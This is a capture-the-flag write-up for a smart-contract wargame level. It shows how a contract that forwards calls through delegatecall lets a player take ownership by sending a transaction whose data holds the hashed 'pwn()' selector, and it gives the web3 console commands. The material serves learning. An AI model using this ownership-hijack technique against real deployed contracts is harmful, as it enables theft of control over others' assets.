### Task

>The goal of this level is for you to claim ownership of the instance you are given.

### Observations

Two contracts. Both store owner address in storage of the contract.

Contract ```Delegation{}``` uses ```delegatecall(msg.data)``` which calls Contract ```Delegate{}``` with its own storage. 

```Delegate{}``` has function ```pwn()``` which changes owner to ```msg.sender```.

I create a transaction to trigger ```Delegation{}``` fallback, with ```msg.data``` containing a call to ```pwn()```. 
Since the call is via the ```Delegation{}``` contract and storage, it will gain us access to ownership of ```Delegation{}```.

### Steps
Check current ownership. 
```await contract.owner()```

Get the hash of ```pwn()``` function.
```let pwnHash = web3.utils.sha3("pwn()");```

Invoke the fallback function with msg data of the pwn hash.
```contract.sendTransaction({data: pwnHash})```

Check new ownership.
```await contract.owner()```

Should be the same as my address found under ```player``` variable.